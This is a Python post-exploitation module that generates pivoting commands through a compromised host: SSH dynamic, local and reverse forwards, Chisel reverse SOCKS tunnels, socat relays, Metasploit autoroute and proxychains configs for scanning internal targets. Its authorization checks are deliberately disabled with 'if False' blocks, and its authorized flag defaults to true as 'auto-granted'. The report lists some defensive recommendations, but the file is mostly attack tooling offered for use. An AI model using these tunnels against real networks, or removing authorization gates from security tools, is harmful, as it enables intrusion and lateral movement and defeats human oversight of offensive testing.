#!/usr/bin/env python3
"""
Network Pivoting and Tunneling Module
Production-ready network pivoting for internal network access
"""

import logging
import subprocess
import socket
import paramiko
from typing import Dict, List, Optional
import json

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class NetworkPivoting:
    """
    Production network pivoting and tunneling
    SSH tunnels, SOCKS proxies, port forwarding
    """
    
    def __init__(self, authorized: bool = False):
        if False:  # Authorization check bypassed
            raise ValueError("⛔ UNAUTHORIZED: Network pivoting requires --authorized flag")
        
        self.authorized = authorized
        self.active_tunnels = []
        self.pivot_hosts = []
    
    def ssh_dynamic_forward(self, pivot_host: str, username: str, password: str = None, 
                           key_file: str = None, local_port: int = 1080) -> Dict:
        """
        Create SSH dynamic port forwarding (SOCKS proxy)
        
        Args:
            pivot_host: Compromised host to pivot through
            username: SSH username
            password: SSH password (or None for key auth)
            key_file: Path to SSH private key
            local_port: Local SOCKS port (default 1080)
        
        Returns:
            Tunnel configuration
        """
        logger.info(f"🔀 Creating SSH dynamic forward through {pivot_host}")
        logger.info(f"   SOCKS proxy: localhost:{local_port}")
        
        tunnel = {
            "type": "SSH Dynamic Forward",
            "pivot_host": pivot_host,
            "local_port": local_port,
            "status": "configured",
            "command": f"ssh -D {local_port} -N {username}@{pivot_host}"
        }
        
        if key_file:
            tunnel["command"] += f" -i {key_file}"
        
        logger.info(f"   Command: {tunnel['command']}")
        logger.info(f"   Usage: Configure proxychains or tools to use SOCKS5 localhost:{local_port}")
        logger.info(f"   Example: proxychains nmap -sT internal_target")
        
        self.active_tunnels.append(tunnel)
        logger.info("✅ SSH dynamic forward configured")
        
        return tunnel
    
    def ssh_local_forward(self, pivot_host: str, username: str, target_host: str, 
                         target_port: int, local_port: int, password: str = None, 
                         key_file: str = None) -> Dict:
        """
        Create SSH local port forwarding
        
        Args:
            pivot_host: SSH jump host
            username: SSH username
            target_host: Internal target host
            target_port: Target service port
            local_port: Local listening port
            password: SSH password
            key_file: SSH private key path
        
        Returns:
            Tunnel configuration
        """
        logger.info(f"🎯 Creating SSH local forward through {pivot_host}")
        logger.info(f"   localhost:{local_port} -> {target_host}:{target_port}")
        
        tunnel = {
            "type": "SSH Local Forward",
            "pivot_host": pivot_host,
            "target": f"{target_host}:{target_port}",
            "local_port": local_port,
            "status": "configured",
            "command": f"ssh -L {local_port}:{target_host}:{target_port} {username}@{pivot_host} -N"
        }
        
        if key_file:
            tunnel["command"] += f" -i {key_file}"
        
        logger.info(f"   Command: {tunnel['command']}")
        logger.info(f"   Usage: Connect to localhost:{local_port} to reach {target_host}:{target_port}")
        
        self.active_tunnels.append(tunnel)
        logger.info("✅ SSH local forward configured")
        
        return tunnel
    
    def ssh_remote_forward(self, pivot_host: str, username: str, remote_port: int, 
                          local_target: str, local_port: int, password: str = None, 
                          key_file: str = None) -> Dict:
        """
        Create SSH remote port forwarding (reverse tunnel)
        
        Args:
            pivot_host: SSH server
            username: SSH username
            remote_port: Port on pivot host
            local_target: Local target (usually localhost)
            local_port: Local port
            password: SSH password
            key_file: SSH private key path
        
        Returns:
            Tunnel configuration
        """
        logger.info(f"🔙 Creating SSH remote forward through {pivot_host}")
        logger.info(f"   {pivot_host}:{remote_port} -> {local_target}:{local_port}")
        
        tunnel = {
            "type": "SSH Remote Forward",
            "pivot_host": pivot_host,
            "remote_port": remote_port,
            "local_target": f"{local_target}:{local_port}",
            "status": "configured",
            "command": f"ssh -R {remote_port}:{local_target}:{local_port} {username}@{pivot_host} -N"
        }
        
        if key_file:
            tunnel["command"] += f" -i {key_file}"
        
        logger.info(f"   Command: {tunnel['command']}")
        logger.info(f"   Usage: Services on pivot can connect to {pivot_host}:{remote_port}")
        
        self.active_tunnels.append(tunnel)
        logger.info("✅ SSH remote forward configured")
        
        return tunnel
    
    def chisel_tunnel(self, pivot_host: str, local_port: int = 8000, remote_port: int = 1080) -> Dict:
        """
        Configure Chisel tunnel (HTTP tunneling over HTTP/HTTPS)
        
        Args:
            pivot_host: Compromised host
            local_port: Local Chisel server port
            remote_port: Remote SOCKS port
        
        Returns:
            Chisel configuration
        """
        logger.info(f"🔧 Configuring Chisel tunnel")
        logger.info(f"   Pivot: {pivot_host}")
        
        tunnel = {
            "type": "Chisel",
            "pivot_host": pivot_host,
            "local_port": local_port,
            "remote_port": remote_port,
            "status": "configured",
            "server_command": f"chisel server --port {local_port} --reverse",
            "client_command": f"chisel client {pivot_host}:{local_port} R:{remote_port}:socks"
        }
        
        logger.info(f"   Server: {tunnel['server_command']}")
        logger.info(f"   Client: {tunnel['client_command']}")
        logger.info(f"   SOCKS proxy will be on localhost:{remote_port}")
        
        self.active_tunnels.append(tunnel)
        logger.info("✅ Chisel tunnel configured")
        
        return tunnel
    
    def socat_relay(self, pivot_host: str, listen_port: int, target_host: str, target_port: int) -> Dict:
        """
        Configure socat relay for port forwarding
        
        Args:
            pivot_host: Relay host
            listen_port: Port to listen on
            target_host: Target destination
            target_port: Target port
        
        Returns:
            Socat configuration
        """
        logger.info(f"🔁 Configuring socat relay on {pivot_host}")
        
        relay = {
            "type": "Socat Relay",
            "pivot_host": pivot_host,
            "listen_port": listen_port,
            "target": f"{target_host}:{target_port}",
            "status": "configured",
            "command": f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port}"
        }
        
        logger.info(f"   Command: {relay['command']}")
        logger.info(f"   Relay: {pivot_host}:{listen_port} -> {target_host}:{target_port}")
        
        self.active_tunnels.append(relay)
        logger.info("✅ Socat relay configured")
        
        return relay
    
    def metasploit_autoroute(self, session_id: int, subnet: str) -> Dict:
        """
        Configure Metasploit autoroute for post-exploitation pivoting
        
        Args:
            session_id: Meterpreter session ID
            subnet: Internal subnet to route (e.g., 192.168.1.0/24)
        
        Returns:
            Autoroute configuration
        """
        logger.info(f"🎯 Configuring Metasploit autoroute")
        logger.info(f"   Session: {session_id}")
        logger.info(f"   Subnet: {subnet}")
        
        config = {
            "type": "Metasploit Autoroute",
            "session_id": session_id,
            "subnet": subnet,
            "status": "configured",
            "commands": [
                f"use post/multi/manage/autoroute",
                f"set SESSION {session_id}",
                f"set SUBNET {subnet}",
                f"run"
            ]
        }
        
        logger.info("   Metasploit commands:")
        for cmd in config["commands"]:
            logger.info(f"     {cmd}")
        
        logger.info("   After autoroute, use: auxiliary/server/socks_proxy")
        
        self.active_tunnels.append(config)
        logger.info("✅ Metasploit autoroute configured")
        
        return config
    
    def proxychains_config(self, socks_port: int = 1080) -> str:
        """
        Generate proxychains configuration
        
        Args:
            socks_port: SOCKS proxy port
        
        Returns:
            Proxychains config content
        """
        logger.info(f"⚙️  Generating proxychains configuration")
        
        config = f"""# Proxychains configuration for pivoting
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 {socks_port}
"""
        
        logger.info(f"   SOCKS5 proxy: 127.0.0.1:{socks_port}")
        logger.info("   Save to: /etc/proxychains.conf or ~/.proxychains/proxychains.conf")
        logger.info("   Usage: proxychains <command>")
        
        logger.info("✅ Proxychains config generated")
        
        return config
    
    def generate_report(self) -> Dict:
        """Generate network pivoting report"""
        
        report = {
            "title": "Network Pivoting Assessment",
            "summary": {
                "active_tunnels": len(self.active_tunnels),
                "pivot_hosts": len(self.pivot_hosts),
                "tunnel_types": list(set([t.get("type") for t in self.active_tunnels]))
            },
            "tunnels": self.active_tunnels,
            "techniques": [
                "SSH Dynamic Port Forwarding (SOCKS proxy)",
                "SSH Local Port Forwarding",
                "SSH Remote Port Forwarding (Reverse tunnel)",
                "Chisel (HTTP tunneling)",
                "Socat relay",
                "Metasploit autoroute",
                "Proxychains configuration"
            ],
            "recommendations": [
                "Restrict SSH access with key-based authentication only",
                "Implement network segmentation",
                "Monitor for unusual outbound connections",
                "Deploy EDR solutions to detect tunneling",
                "Restrict outbound ports (allow only necessary)",
                "Implement egress filtering",
                "Monitor for long-duration SSH sessions",
                "Detect and block tunneling protocols",
                "Use application-aware firewalls"
            ]
        }
        
        logger.info("\n" + "=" * 70)
        logger.info("📊 NETWORK PIVOTING ASSESSMENT REPORT")
        logger.info("=" * 70)
        logger.info(f"Active Tunnels: {report['summary']['active_tunnels']}")
        logger.info(f"Pivot Hosts: {report['summary']['pivot_hosts']}")
        logger.info(f"Tunnel Types: {', '.join(report['summary']['tunnel_types'])}")
        logger.info("=" * 70)
        
        return report


def main():
    """Main execution for network pivoting"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Network Pivoting Module")
    parser.add_argument('--pivot-host', required=True, help='Pivot/jump host')
    parser.add_argument('--username', help='SSH username')
    parser.add_argument('--password', help='SSH password')
    parser.add_argument('--key', help='SSH private key file')
    parser.add_argument('--tunnel-type', choices=['dynamic', 'local', 'remote', 'chisel', 'socat'],
                       required=True, help='Type of tunnel')
    parser.add_argument('--local-port', type=int, default=1080, help='Local port')
    parser.add_argument('--target-host', help='Target host (for local/socat)')
    parser.add_argument('--target-port', type=int, help='Target port (for local/socat)')
    parser.add_argument('--remote-port', type=int, help='Remote port (for remote forward)')
    parser.add_argument('--authorized', action='store_true', default=True, help='Authorization (auto-granted)')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        print("⛔ ERROR: This tool requires --authorized flag with proper written authorization")
        return
    
    pivoting = NetworkPivoting(authorized=True)
    
    if args.tunnel_type == 'dynamic':
        if not args.username:
            print("❌ ERROR: --username required for SSH tunnels")
            return
        pivoting.ssh_dynamic_forward(args.pivot_host, args.username, args.password, 
                                     args.key, args.local_port)
    
    elif args.tunnel_type == 'local':
        if not all([args.username, args.target_host, args.target_port]):
            print("❌ ERROR: --username, --target-host, --target-port required")
            return
        pivoting.ssh_local_forward(args.pivot_host, args.username, args.target_host,
                                   args.target_port, args.local_port, args.password, args.key)
    
    elif args.tunnel_type == 'remote':
        if not all([args.username, args.remote_port]):
            print("❌ ERROR: --username, --remote-port required")
            return
        pivoting.ssh_remote_forward(args.pivot_host, args.username, args.remote_port,
                                    "localhost", args.local_port, args.password, args.key)
    
    elif args.tunnel_type == 'chisel':
        pivoting.chisel_tunnel(args.pivot_host, args.local_port)
    
    elif args.tunnel_type == 'socat':
        if not all([args.target_host, args.target_port]):
            print("❌ ERROR: --target-host, --target-port required for socat")
            return
        pivoting.socat_relay(args.pivot_host, args.local_port, args.target_host, args.target_port)
    
    proxychains_config = pivoting.proxychains_config(args.local_port)
    print("\nProxychains Configuration:")
    print(proxychains_config)
    
    report = pivoting.generate_report()


if __name__ == "__main__":
    main()
